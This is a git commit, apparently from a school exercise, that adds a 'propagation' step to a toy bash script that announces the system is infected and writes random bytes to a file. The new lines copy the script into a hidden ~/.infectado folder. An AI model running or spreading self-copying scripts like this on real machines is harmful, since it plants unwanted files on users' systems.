f55c307f4790470482b6d8d29127d8adf25959f6
rodbla <mrodbla937@ieszaidinvergeles.org>
2025-02-21 02:24:55 +0100

    Propagacion agregada

--- gnomed.bash
+++ gnomed.bash
@@ -4,3 +4,9 @@ echo "¡Tu sistema está infectado! 😈"
 
 ## payload simulado
 dd if=/dev/urandom of=$HOME/infectado.txt bs=512 count=1
+
+## propagacion
+mkdir $HOME/.infectado
+cp $(realpath "$0") $HOME/.infectado
+
+
